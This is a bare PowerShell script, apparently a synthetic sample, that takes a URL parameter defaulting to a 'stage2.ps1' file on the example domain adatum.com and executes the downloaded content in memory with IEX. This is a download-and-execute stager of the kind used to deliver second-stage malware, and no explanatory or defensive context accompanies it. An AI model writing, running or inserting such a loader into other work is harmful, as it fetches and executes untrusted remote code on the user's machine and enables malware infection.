[CmdletBinding()]
param(
    [string]$DownloadUrl = 'https://adatum.com/stage2.ps1',
    [int]$RequestTimeout = 73
)
IEX (Invoke-WebRequest -Uri $DownloadUrl -UseBasicParsing).Content
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
